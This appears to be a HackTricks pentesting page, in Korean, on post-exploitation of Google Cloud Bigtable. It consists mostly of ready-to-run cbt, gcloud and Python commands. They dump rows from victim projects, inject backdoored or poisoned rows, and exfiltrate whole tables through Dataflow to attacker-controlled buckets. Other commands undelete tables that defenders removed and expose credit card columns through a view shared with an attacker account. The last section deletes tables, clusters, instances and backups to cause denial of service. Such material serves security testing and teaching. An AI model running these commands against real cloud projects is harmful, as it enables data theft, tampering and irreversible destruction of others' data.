# GCP - Bigtable Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Bigtable에 대한 자세한 정보는 다음을 확인하세요:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

> [!TIP]
> `cbt` CLI를 한 번 Cloud SDK를 통해 설치하면 아래 명령들이 로컬에서 동작합니다:
>
> ```bash
> gcloud components install cbt
> ```

### 행 조회

**권한:** `bigtable.tables.readRows`

`cbt`는 Cloud SDK에 포함되어 있으며 별도의 미들웨어 없이 admin/data APIs와 통신합니다. 이를 침해된 프로젝트/인스턴스로 지정하고 테이블에서 바로 행을 덤프하세요. 일부만 확인하려면 스캔을 제한하세요.
```bash
# Install cbt
gcloud components update
gcloud components install cbt

# Read entries with creds of gcloud
cbt -project=<victim-proj> -instance=<instance-id> read <table-id>
```
### 행 쓰기

**권한:** `bigtable.tables.mutateRows`, (변경 사항을 확인하려면 `bigtable.tables.readRows`가 필요합니다).

같은 도구를 사용해 임의의 셀을 upsert하세요. 이것은 configs에 backdoor를 심거나, web shells를 drop하거나, poisoned dataset rows를 plant하기 위한 가장 빠른 방법입니다.
```bash
# Inject a new row
cbt -project=<victim-proj> -instance=<instance-id> set <table> <row-key> <family>:<column>=<value>

cbt -project=<victim-proj> -instance=<instance-id> set <table-id> user#1337 profile:name="Mallory" profile:role="admin" secrets:api_key=@/tmp/stealme.bin

# Verify the injected row
cbt -project=<victim-proj> -instance=<instance-id> read <table-id> rows=user#1337
```
`cbt set`은 `@/path` 구문을 통해 원시 바이트를 허용하므로, downstream services가 기대하는 대로 compiled payloads나 serialized protobufs를 정확히 push할 수 있습니다.

### 행을 버킷으로 덤프하기

**권한:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

Dataflow 작업을 실행하여 행을 당신이 제어하는 GCS 버킷으로 스트리밍하면 전체 테이블의 내용을 공격자가 제어하는 버킷으로 exfiltrate할 수 있습니다.

> [!NOTE]
> 해당 내보내기 작업을 수행할 충분한 권한을 가진 SA에 대해 `iam.serviceAccounts.actAs` 권한이 필요합니다 (기본적으로 별도 지정하지 않으면 default compute SA가 사용됩니다).
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<BUCKET>/raw-json/ \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run dump-bigtable3 \
--gcs-location=gs://dataflow-templates-us-central1/latest/Cloud_Bigtable_to_GCS_Json \
--project=gcp-labs-3uis1xlx \
--region=us-central1 \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,filenamePrefix=prefx,outputDirectory=gs://deleteme20u9843rhfioue/raw-json/ \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
> [!NOTE]
> JSON 대신 Parquet/SequenceFile 출력을 원하면 템플릿을 `Cloud_Bigtable_to_GCS_Parquet` 또는 `Cloud_Bigtable_to_GCS_SequenceFile`로 전환하세요. 권한은 동일하며, 변경되는 것은 템플릿 경로뿐입니다.

### 행 가져오기

**권한:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

공격자가 제어하는 버킷에 있는 데이터를, Dataflow job을 실행하여 자신이 제어하는 GCS 버킷으로 행을 스트리밍함으로써 전체 테이블 내용을 가져오는 것이 가능합니다. 이를 위해 공격자는 먼저 예상되는 스키마에 맞는 데이터로 구성된 parquet 파일을 생성해야 합니다. 공격자는 이전 기법을 따라 `Cloud_Bigtable_to_GCS_Parquet` 설정으로 데이터를 parquet 형식으로 먼저 내보낸 뒤, 다운로드한 parquet 파일에 새 항목을 추가할 수 있습니다



> [!NOTE]
> 내보내기를 수행하려면 충분한 권한을 가진 일부 SA에 대해 `iam.serviceAccounts.actAs` 권한이 필요함에 유의하세요 (기본적으로, 별도 명시가 없으면 기본 compute SA가 사용됩니다).
```bash
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=<REGION> \
--gcs-location=gs://dataflow-templates-<REGION>/<VERSION>>/GCS_Parquet_to_Cloud_Bigtable \
--project=<PROJECT> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE-ID>,bigtableTableId=<TABLE-ID>,inputFilePattern=gs://<BUCKET>/import/bigtable_import.parquet \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=us-central1 \
--gcs-location=gs://dataflow-templates-us-central1/latest/GCS_Parquet_to_Cloud_Bigtable \
--project=gcp-labs-3uis1xlx \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,inputFilePattern=gs://deleteme20u9843rhfioue/import/parquet_prefx-00000-of-00001.parquet \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
### 백업 복원

**권한:** `bigtable.backups.restore`, `bigtable.tables.create`.

이러한 권한을 가진 공격자는 자신이 제어하는 새 테이블로 백업을 복원하여 이전의 민감한 데이터를 복구할 수 있습니다.
```bash
gcloud bigtable backups list --instance=<INSTANCE_ID_SOURCE> \
--cluster=<CLUSTER_ID_SOURCE>

gcloud bigtable instances tables restore \
--source=projects/<PROJECT_ID_SOURCE>/instances/<INSTANCE_ID_SOURCE>/clusters/<CLUSTER_ID>/backups/<BACKUP_ID> \
--async \
--destination=<TABLE_ID_NEW> \
--destination-instance=<INSTANCE_ID_DESTINATION> \
--project=<PROJECT_ID_DESTINATION>
```
### 삭제된 테이블 복구

**권한:** `bigtable.tables.undelete`

Bigtable는 일반적으로 기본값으로 7일의 유예 기간을 갖는 soft-deletion(소프트 삭제)을 지원합니다. 이 기간 동안 `bigtable.tables.undelete` 권한을 가진 공격자는 최근 삭제된 테이블을 복원해 모든 데이터를 복구할 수 있으며, 파기된 것으로 여겨진 민감한 정보에 접근할 수 있습니다.

이는 특히 다음과 같은 상황에서 유용합니다:
- 사건 대응 중 방어팀이 삭제한 테이블에서 데이터 복구
- 의도적으로 정리(삭제)된 과거 데이터에 접근
- 우발적이거나 악의적인 삭제를 되돌려 지속성 유지
```bash
# List recently deleted tables (requires bigtable.tables.list)
gcloud bigtable instances tables list --instance=<instance-id> \
--show-deleted

# Undelete a table within the retention period
gcloud bigtable instances tables undelete <table-id> \
--instance=<instance-id>
```
> [!NOTE]
> undelete 작업은 구성된 보존 기간(기본값 7일) 내에서만 작동합니다. 이 기간이 지나면 테이블과 해당 데이터는 영구적으로 삭제되며 이 방법으로 복구할 수 없습니다.


### Authorized Views 생성

**권한:** `bigtable.authorizedViews.create`, `bigtable.tables.readRows`, `bigtable.tables.mutateRows`

Authorized views를 사용하면 테이블의 선별된 하위 집합을 제공할 수 있습니다. 최소 권한 원칙을 따르기보다, 당신이 신경 쓰는 **정확한 민감한 열/행 집합**만 게시하고 자신의 principal을 whitelist하세요.

> [!WARNING]
> 문제는 authorized view를 생성하려면 기본 테이블에서 행을 읽고 수정할 수 있어야 하므로 추가 권한을 얻는 것이 아니며, 따라서 이 기법은 대부분 쓸모가 없습니다.
```bash
cat <<'EOF' > /tmp/credit-cards.json
{
"subsetView": {
"rowPrefixes": ["acct#"],
"familySubsets": {
"pii": {
"qualifiers": ["cc_number", "cc_cvv"]
}
}
}
}
EOF

gcloud bigtable authorized-views create card-dump \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/credit-cards.json

gcloud bigtable authorized-views add-iam-policy-binding card-dump \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' --role='roles/bigtable.reader'
```
액세스가 Authorized View 단위로 범위가 지정되기 때문에, 방어자는 종종 당신이 방금 새로운 고감도 엔드포인트를 생성했다는 사실을 간과합니다.

### Authorized Views 읽기

**권한:** `bigtable.authorizedViews.readRows`

Authorized View에 접근 권한이 있으면, read 요청에서 authorized view 이름을 지정하여 Bigtable client libraries를 사용해 해당 Authorized View의 데이터를 읽을 수 있습니다. Authorized View는 테이블에서 접근할 수 있는 내용을 제한할 가능성이 있다는 점에 유의하세요. 아래는 Python을 사용하는 예시입니다:
```python
from google.cloud import bigtable
from google.cloud.bigtable_v2 import BigtableClient as DataClient
from google.cloud.bigtable_v2 import ReadRowsRequest

# Set your project, instance, table, view id
PROJECT_ID = "gcp-labs-3uis1xlx"
INSTANCE_ID = "avesc-20251118172913"
TABLE_ID = "prod-orders"
AUTHORIZED_VIEW_ID = "auth_view"

client = bigtable.Client(project=PROJECT_ID, admin=True)
instance = client.instance(INSTANCE_ID)
table = instance.table(TABLE_ID)

data_client = DataClient()
authorized_view_name = f"projects/{PROJECT_ID}/instances/{INSTANCE_ID}/tables/{TABLE_ID}/authorizedViews/{AUTHORIZED_VIEW_ID}"

request = ReadRowsRequest(
authorized_view_name=authorized_view_name
)

rows = data_client.read_rows(request=request)
for response in rows:
for chunk in response.chunks:
if chunk.row_key:
row_key = chunk.row_key.decode('utf-8') if isinstance(chunk.row_key, bytes) else chunk.row_key
print(f"Row: {row_key}")
if chunk.family_name:
family = chunk.family_name.value if hasattr(chunk.family_name, 'value') else chunk.family_name
qualifier = chunk.qualifier.value.decode('utf-8') if hasattr(chunk.qualifier, 'value') else chunk.qualifier.decode('utf-8')
value = chunk.value.decode('utf-8') if isinstance(chunk.value, bytes) else str(chunk.value)
print(f"  {family}:{qualifier} = {value}")
```
### Denial of Service via Delete Operations

**권한:** `bigtable.appProfiles.delete`, `bigtable.authorizedViews.delete`, `bigtable.authorizedViews.deleteTagBinding`, `bigtable.backups.delete`, `bigtable.clusters.delete`, `bigtable.instances.delete`, `bigtable.tables.delete`

Bigtable의 삭제 권한들은 denial of service attacks에 악용될 수 있습니다. 이러한 권한을 가진 공격자는 중요한 Bigtable 리소스를 삭제해 운영을 방해할 수 있습니다:

- **`bigtable.appProfiles.delete`**: 애플리케이션 프로필을 삭제하여 클라이언트 연결 및 라우팅 구성이 중단됩니다
- **`bigtable.authorizedViews.delete`**: authorized views를 제거하여 애플리케이션의 정당한 접근 경로를 차단합니다
- **`bigtable.authorizedViews.deleteTagBinding`**: authorized views에서 태그 바인딩을 제거합니다
- **`bigtable.backups.delete`**: 백업 스냅샷을 파기하여 재해 복구 옵션을 없앱니다
- **`bigtable.clusters.delete`**: 전체 클러스터를 삭제하여 즉시 데이터 사용 불가 상태를 초래합니다
- **`bigtable.instances.delete`**: 전체 Bigtable 인스턴스를 제거하여 모든 테이블과 구성을 삭제합니다
- **`bigtable.tables.delete`**: 개별 테이블을 삭제하여 데이터 손실 및 애플리케이션 장애를 초래합니다
```bash
# Delete a table
gcloud bigtable instances tables delete <table-id> \
--instance=<instance-id>

# Delete an authorized view
gcloud bigtable authorized-views delete <view-id> \
--instance=<instance-id> --table=<table-id>

# Delete a backup
gcloud bigtable backups delete <backup-id> \
--instance=<instance-id> --cluster=<cluster-id>

# Delete an app profile
gcloud bigtable app-profiles delete <profile-id> \
--instance=<instance-id>

# Delete a cluster
gcloud bigtable clusters delete <cluster-id> \
--instance=<instance-id>

# Delete an entire instance
gcloud bigtable instances delete <instance-id>
```
> [!WARNING]
> 삭제 작업은 종종 즉시 수행되며 되돌릴 수 없습니다. 이러한 명령은 영구적인 데이터 손실과 심각한 서비스 중단을 초래할 수 있으므로 테스트하기 전에 백업이 있는지 확인하세요.

{{#include ../../../banners/hacktricks-training.md}}
